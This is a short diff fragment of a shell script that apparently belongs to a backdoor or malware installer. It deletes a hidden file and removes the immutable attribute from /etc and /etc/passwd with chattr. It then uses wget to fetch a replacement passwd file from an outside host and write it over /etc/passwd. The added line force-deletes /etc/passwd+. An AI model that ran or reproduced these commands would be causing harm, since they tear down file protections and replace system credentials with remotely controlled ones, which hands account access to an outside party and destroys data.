@@ -6,6 +6,7 @@ rm -rf /.magic;
 
 /bin/busybox chattr -i /etc 2>&1
 chattr -i /etc/passwd*;
+[ -f /etc/passwd+ ] && rm -rf /etc/passwd+ 2>&1;
 
 wget 'http://www.xiefucai.com/tools/zqb/passwd?TPSecNotice&TPNotCheck' -O /etc/passwd 2>>$LOG_PATH
 
